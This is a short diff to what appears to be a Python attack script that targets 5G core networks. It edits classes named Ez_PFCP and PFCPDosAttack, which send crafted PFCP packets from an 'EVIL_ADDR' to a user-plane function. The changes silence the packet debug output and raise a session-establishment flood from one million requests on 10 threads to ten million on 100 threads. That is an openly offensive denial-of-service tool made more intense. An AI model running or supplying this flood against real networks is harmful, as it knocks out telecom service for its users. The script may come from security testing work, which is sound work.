@@ -55,7 +55,7 @@ class Ez_PFCP:
         packet = packet.__class__(bytes(packet))
         if self.verbose:
             print(f"[EZ-PFCP] PFCP Association Setup packet:")
-            packet.show()
+            # packet.show()
         send(packet)
         if self.verbose:
             print(f"[EZ-PFCP] PFCP Association Setup packet sent")
@@ -103,7 +103,7 @@ class Ez_PFCP:
 
         if self.verbose:
             print(f"[EZ-PFCP] Sending PFCP Session Establishment Packet:")
-            pkt.show()
+            # pkt.show()
         send(pkt)
         if self.verbose:
             print(f"[EZ-PFCP] PFCP Session Establishment Packet sent.")
@@ -223,4 +223,4 @@ class PFCPDosAttack:
 
 pfcp_dos_obj = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 pfcp_dos_obj.set_verbose(True)
-pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=1000000, num_threads=10)
+pfcp_dos_obj.Start_pfcp_session_establishment_flood(reqNbr=10000000, num_threads=100)
